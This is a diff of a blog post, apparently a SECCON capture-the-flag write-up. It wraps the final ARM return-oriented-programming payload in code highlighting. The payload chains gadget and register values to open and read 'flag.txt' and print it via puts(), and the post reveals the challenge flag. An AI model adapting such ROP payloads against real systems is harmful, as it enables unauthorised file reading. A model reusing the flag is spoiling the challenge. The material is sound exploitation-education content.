@@ -78,6 +78,7 @@ After returning from the syscall, R0 will be set to the file descriptor. We can 
 
 We're almost there! The data has now been read, all that remains is to print it. For that purpose we can use `puts()` @0x4268. Here is the final problem: how to set R0 to point to the address of the buffer? Well... I don't think we can, however we can put something in R1 instead and jump to 0x425C (skip `MOV R1, R0`)... Now, how to set R1? Go back to square one! In `check_pwd()`, the last instruction @0x42B0 pops R1-R6/R11/PC, so we can just jump to it as a new register loader! That way, we put the address of the buffer in R1, the address of `puts()` in PC, and *at last* we're done. Here is the full message:
 
+{% highlight sh %}
     #         R1                   R2                   R3                   R4-R5        R6 => R0             R11
     #         (arg 1 = &"flag.txt") (arg 2 = O_RDONLY)  (arg 3 = 0)                       (syscall number)
     message = '\x30\xf0\xff\x1f' + '\x00\x00\x00\x00' + '\x00\x00\x00\x00' + 'xxxx' * 2 + '\x05\x00\x00\x00' + 'xxxx'
@@ -87,6 +88,7 @@ We're almost there! The data has now been read, all that remains is to print it.
     #          R1                   R2-6, R11    puts()               @0x1FFFF030
     #          (arg 1 = &"flag.txt")
     message += '\x30\xf0\xff\x1f' + 'xxxx' * 6 + '\x70\x42\x00\x00' + 'flag.txt\x00' + '\n'
+{% endhighlight %}
 
 And with this message, the miracle finally happens: the server replies with the contents of the file, i.e. the token 'SECCON{TeaBreakAtWork}'.
 
